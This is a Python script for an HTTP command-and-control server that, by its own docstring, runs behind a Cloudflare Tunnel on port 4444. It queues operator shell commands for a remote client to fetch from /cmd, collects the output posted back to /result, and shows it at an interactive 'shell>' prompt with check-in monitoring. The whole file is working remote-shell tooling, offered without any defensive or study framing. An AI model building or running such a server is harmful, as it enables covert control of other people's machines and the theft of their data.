#!/usr/bin/env python3
"""
HTTP-based C2 server. Runs on Mac behind Cloudflare Tunnel.
Usage: python3 server.py
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import socket
import threading
import sys
import time
import queue
import readline  # enables arrow-key history in input()

pending_command = None
lock = threading.Lock()
last_checkin = 0
result_queue = queue.Queue()


class DualStackHTTPServer(ThreadingMixIn, HTTPServer):
    """Listen on both IPv4 and IPv6 so cloudflared can connect via either."""
    daemon_threads = True
    address_family = socket.AF_INET6
    request_queue_size = 32  # allow more queued connections

    def server_bind(self):
        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()


class Handler(BaseHTTPRequestHandler):
    # Disable default logging — we do our own
    def log_message(self, fmt, *args):
        pass

    # Persistent connections (HTTP/1.1 keep-alive)
    protocol_version = "HTTP/1.1"

    def do_GET(self):
        global pending_command, last_checkin
        if self.path == "/cmd":
            last_checkin = time.time()
            with lock:
                cmd = pending_command or ""
                pending_command = None
            body = cmd.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "keep-alive")
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/ping":
            # Lightweight health-check endpoint
            last_checkin = time.time()
            body = b"pong"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "keep-alive")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.send_header("Connection", "close")
            self.end_headers()

    def do_POST(self):
        if self.path == "/result":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace")
            result_queue.put(body)
            resp = b"ok"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(resp)))
            self.send_header("Connection", "keep-alive")
            self.end_headers()
            self.wfile.write(resp)
        else:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.send_header("Connection", "close")
            self.end_headers()


def result_printer():
    """Drain the result queue and print results cleanly."""
    while True:
        try:
            body = result_queue.get(timeout=0.5)
            # Clear the current input line, print result, re-show prompt
            sys.stdout.write("\r\033[K" + body)
            sys.stdout.write("shell> ")
            sys.stdout.flush()
        except queue.Empty:
            pass


def input_loop():
    global pending_command
    while True:
        try:
            cmd = input("shell> ")
            if not cmd.strip():
                continue
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            sys.exit(0)

        if cmd.strip().lower() == "status":
            elapsed = time.time() - last_checkin if last_checkin > 0 else -1
            if elapsed < 0:
                print("[*] No client check-in yet.")
            elif elapsed < 10:
                print(f"[*] Client ONLINE — last check-in {elapsed:.1f}s ago")
            else:
                print(f"[!] Client may be OFFLINE — last check-in {elapsed:.0f}s ago")
            continue

        with lock:
            if pending_command:
                print("[!] Previous command still pending — overwriting.")
            pending_command = cmd


def status_printer():
    shown_warning = False
    while True:
        time.sleep(10)
        if last_checkin > 0:
            elapsed = time.time() - last_checkin
            if elapsed > 20 and not shown_warning:
                sys.stdout.write(
                    f"\r\033[K[!] No check-in for {elapsed:.0f}s — client may be offline\nshell> "
                )
                sys.stdout.flush()
                shown_warning = True
            elif elapsed <= 20:
                shown_warning = False


if __name__ == "__main__":
    PORT = 4444
    server = DualStackHTTPServer(("::", PORT), Handler)
    print(f"[*] Listening on port {PORT} (IPv4 + IPv6)")
    print("[*] Waiting for client to connect...")
    print("[*] Type 'status' to check client connectivity\n")

    threading.Thread(target=input_loop, daemon=True).start()
    threading.Thread(target=result_printer, daemon=True).start()
    threading.Thread(target=status_printer, daemon=True).start()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
